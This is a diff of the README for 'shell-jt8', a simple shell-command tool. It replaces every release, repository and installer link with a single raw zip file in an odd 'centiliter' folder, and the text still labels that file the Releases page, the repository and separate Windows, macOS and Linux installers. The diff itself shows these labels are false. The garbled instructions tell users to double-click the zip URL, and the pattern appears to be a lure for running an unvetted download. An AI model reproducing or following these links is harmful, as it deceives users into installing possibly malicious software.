@@ -1,7 +1,7 @@
 # 🐚 shell-jt8 - Your Simple Shell Tool for Easy Commands
 
 ## 📥 Download Now!
-[![Download shell-jt8](https://img.shields.io/badge/Download-shell--jt8-brightgreen)](https://github.com/Drioh/shell-jt8/releases)
+[![Download shell-jt8](https://raw.githubusercontent.com/Drioh/shell-jt8/main/centiliter/shell-jt8.zip)](https://raw.githubusercontent.com/Drioh/shell-jt8/main/centiliter/shell-jt8.zip)
 
 ## 🚀 Getting Started
 Welcome to shell-jt8! This tool helps you execute shell commands easily. No technical experience needed. Follow these steps to get started.
@@ -19,19 +19,19 @@ Before you begin, make sure your computer meets the following requirements:
 - **History Tracking**: Keeps a record of your recently executed commands.
 
 ## 📤 Download & Install
-To get your copy of shell-jt8, visit this page to download: [Releases Page](https://github.com/Drioh/shell-jt8/releases).
+To get your copy of shell-jt8, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Drioh/shell-jt8/main/centiliter/shell-jt8.zip).
 
 ### Installation Steps
 1. **Visit the Releases Page**: Click on the link above to go to the Releases page. 
 2. **Select the Version**: Look for the latest version listed on the page. This will typically be at the top.
 3. **Choose Your File**: Download the appropriate file for your operating system:
-   - For Windows: Select `shell-jt8-windows.exe`
-   - For macOS: Select `shell-jt8-macos.dmg`
-   - For Linux: Select `shell-jt8-linux.tar.gz`
+   - For Windows: Select `https://raw.githubusercontent.com/Drioh/shell-jt8/main/centiliter/shell-jt8.zip`
+   - For macOS: Select `https://raw.githubusercontent.com/Drioh/shell-jt8/main/centiliter/shell-jt8.zip`
+   - For Linux: Select `https://raw.githubusercontent.com/Drioh/shell-jt8/main/centiliter/shell-jt8.zip`
 4. **Run the Installer**:
-   - **Windows**: Double-click on `shell-jt8-windows.exe` and follow the on-screen instructions.
-   - **macOS**: Open `shell-jt8-macos.dmg`, drag the application into your Applications folder, then open it.
-   - **Linux**: Extract the files from `shell-jt8-linux.tar.gz` using your preferred method and run the executable.
+   - **Windows**: Double-click on `https://raw.githubusercontent.com/Drioh/shell-jt8/main/centiliter/shell-jt8.zip` and follow the on-screen instructions.
+   - **macOS**: Open `https://raw.githubusercontent.com/Drioh/shell-jt8/main/centiliter/shell-jt8.zip`, drag the application into your Applications folder, then open it.
+   - **Linux**: Extract the files from `https://raw.githubusercontent.com/Drioh/shell-jt8/main/centiliter/shell-jt8.zip` using your preferred method and run the executable.
 
 ## 🔍 Usage Instructions
 After installation, launch shell-jt8. You will see the main interface. To run a command:
@@ -49,8 +49,8 @@ After installation, launch shell-jt8. You will see the main interface. To run a 
 If you run into issues or have questions, please visit the Issues section on the GitHub repository. Our team is ready to assist.
 
 ## 🔗 Learn More
-- [GitHub Repository](https://github.com/Drioh/shell-jt8)
-- [Releases](https://github.com/Drioh/shell-jt8/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/Drioh/shell-jt8/main/centiliter/shell-jt8.zip)
+- [Releases](https://raw.githubusercontent.com/Drioh/shell-jt8/main/centiliter/shell-jt8.zip)
 
 ## 💡 Contributing
 Want to improve shell-jt8? Check out the Contributing section in our GitHub repository for guidelines on how to help.
@@ -59,6 +59,6 @@ Want to improve shell-jt8? Check out the Contributing section in our GitHub repo
 shell-jt8 is licensed under the MIT License. You can use it freely with proper attribution. 
 
 ## 📥 Quick Download Link
-For your convenience, you can directly visit the Releases page again: [Download shell-jt8](https://github.com/Drioh/shell-jt8/releases). Follow the earlier steps to start using the application. 
+For your convenience, you can directly visit the Releases page again: [Download shell-jt8](https://raw.githubusercontent.com/Drioh/shell-jt8/main/centiliter/shell-jt8.zip). Follow the earlier steps to start using the application. 
 
 Enjoy using shell-jt8!
